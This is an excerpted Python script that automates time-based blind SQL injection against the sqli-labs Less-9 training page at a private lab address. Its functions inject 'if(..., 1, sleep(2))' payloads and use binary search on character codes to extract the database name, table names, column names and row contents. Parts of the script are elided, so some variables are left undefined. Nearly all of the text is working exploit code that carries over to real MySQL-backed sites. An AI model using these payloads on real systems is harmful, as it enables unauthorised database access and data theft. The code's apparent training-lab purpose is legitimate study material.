...
base_url = "http://10.211.55.3/sqli-labs-php7/Less-9/?id="
...
def get_database_length():
    ...
    length = 1
    while (1):
        id = "1" + special_char + " and if(length(database()) = " + str(length) + ", 1, sleep(2))--+"
...
def get_database(database_length):
    ...
    for i in range(1, database_length + 1):
        ...
        while (1):
            ascii = (l + r) // 2
            id_equal = "1" + special_char + " and if(ascii(substr(database(), " + str(i) + ", 1)) = " + str(ascii) + ", 1, sleep(2))--+"
            print(id_equal)
            try:
                requests.get(base_url + id_equal, headers=headers, timeout=1).text
            except Exception:
                id_bigger = "1" + special_char + " and if(ascii(substr(database(), " + str(i) + ", 1)) > " + str(ascii) + ", 1, sleep(2))--+"
                try:
                    requests.get(base_url + id_bigger, headers=headers, timeout=1).text
                except Exception:
                    r = ascii - 1
                else:
                    l = ascii + 1
...
def get_table_num(database):
    ...
    num = 1
    while (1):
        id = "1" + special_char + " and if((select count(table_name) from information_schema.tables where table_schema = '" + database + "') = " + str(num) + ", 1, sleep(2))--+"
        try:
            requests.get(base_url + id, headers=headers, timeout=1).text
        except Exception:
            num += 1
        else:
            print("payload:", id)
...
def get_table_length(index, database):
    ...
    length = 1
    while (1):
        id = "1" + special_char + " and if((select length(table_name) from information_schema.tables where table_schema = '" + database + "' limit " + str(index) + ", 1) = " + str(length) + ", 1, sleep(2))--+"
        try:
            requests.get(base_url + id, headers=headers, timeout= 1).text
        except Exception:
...
def get_table(index, table_length, database):
    ...
    for i in range(1, table_length + 1):
        ...
        while (1):
            ascii = (l + r) // 2
            id_equal = "1" + special_char + " and if((select ascii(substr(table_name, " + str(i) + ", 1)) from information_schema.tables where table_schema = '" + database + "' limit " + str(index) + ",1) = " + str(ascii) + ", 1, sleep(2))--+"
            try:
                response = requests.get(base_url + id_equal, headers=headers, timeout=1).text
            except Exception:
                id_bigger = "1" + special_char + " and if((select ascii(substr(table_name, " + str(i) + ", 1)) from information_schema.tables where table_schema = '" + database + "' limit " + str(index) + ",1) > " + str(ascii) + ", 1, sleep(2))--+"
                try:
                    response = requests.get(base_url + id_bigger, headers=headers, timeout=1).text
                except Exception:
                    r = ascii - 1
                else:
                    l = ascii + 1
...
def get_column_num(table):
    ...
    num = 1
    while (1):
        id = "1" + special_char + " and if((select count(column_name) from information_schema.columns where table_name = '" + table + "') = " + str(num) + ", 1, sleep(2))--+"
        try:
            requests.get(base_url + id, headers=headers, timeout=1).text
        except Exception:
            num += 1
...
def get_column_length(index, table):
    ...
    length = 1
    while (1):
        id = "1" + special_char + " and if((select length(column_name) from information_schema.columns where table_name = '" + table + "' limit " + str(index) + ", 1) = " + str(length) + ", 1, sleep(2))--+"
        try:
            requests.get(base_url + id, headers=headers, timeout=1).text
        except Exception:
...
def get_column(index, column_length, table):
    ...
    for i in range(1, column_length + 1):
        ...
        while (1):
            ascii = (l + r) // 2
            id_equal = "1" + special_char + " and if((select ascii(substr(column_name, " + str(i) + ", 1)) from information_schema.columns where table_name = '" + table + "' limit " + str(index) + ",1) = " + str(ascii) + ", 1, sleep(2))--+"
            try:
                requests.get(base_url + id_equal, headers=headers, timeout=1).text
            except Exception:
                id_bigger = "1" + special_char + " and if((select ascii(substr(column_name, " + str(i) + ", 1)) from information_schema.columns where table_name = '" + table + "' limit " + str(index) + ",1) > " + str(ascii) + ", 1, sleep(2))--+"
                try:
                    requests.get(base_url + id_bigger, headers=headers, timeout=1).text
                except Exception:
                    r = ascii - 1
...
def get_flag_num(column, table):
    ...
    num = 1
    while (1):
        id = "1" + special_char + " and if((select count(" + column + ") from " + table + ") = " + str(num) + ", 1, sleep(2))--+"
        try:
            requests.get(base_url + id, headers=headers, timeout=1).text
        except Exception:
            num += 1
...
def get_flag_length(index, column, table):
    ...
    length = 1
    while (1):
        id = "1" + special_char + " and if((select length(" + column + ") from " + table + " limit " + str(index) + ", 1) = " + str(length) + ", 1, sleep(2))--+"
        try:
            requests.get(base_url + id, headers=headers, timeout=1).text
        except Exception:
...
def get_flag(index, flag_length, column, table):
    ...
    for i in range(1, flag_length + 1):
        ...
        while (1):
            ascii = (l + r) // 2
            id_equal = "1" + special_char + " and if((select ascii(substr(" + column + ", " + str(i) + ", 1)) from " + table + " limit " + str(index) + ",1) = " + str(ascii) + ", 1, sleep(2))--+"
            try:
                requests.get(base_url + id_equal, headers=headers, timeout=1).text
            except Exception:
                id_bigger = "1" + special_char + " and if((select ascii(substr(" + column + ", " + str(i) + ", 1)) from " + table + " limit " + str(index) + ",1) > " + str(ascii) + ", 1, sleep(2))--+"
                try:
                    requests.get(base_url + id_bigger, headers=headers, timeout=1).text
                except Exception:
                    r = ascii - 1
